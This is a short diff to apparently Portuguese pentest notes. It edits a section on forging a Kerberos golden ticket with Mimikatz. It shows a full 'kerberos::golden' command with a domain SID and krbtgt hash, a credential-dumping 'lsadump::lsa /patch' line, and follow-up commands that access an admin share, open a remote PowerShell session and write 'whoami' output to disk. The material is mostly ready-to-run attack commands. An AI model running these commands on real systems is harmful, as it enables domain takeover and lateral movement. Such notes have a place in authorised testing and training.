@@ -1251,10 +1251,11 @@ lsadump::lsa /patch
 ```
 kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
 ```
-TENTAR SE CONECTAR EM OUTRO SERVIDOR (NAO CONECTOU NO DC):
+##### GOLDEN TICKET MIMIKATZ - TESTE DE CONECTIVIDADE (NAO CONECTOU NO DC):
 ```
 dir \\server01\c$
 enter-pssession -computername server01
+whoami > c:\eu.txt
 ```
 
 
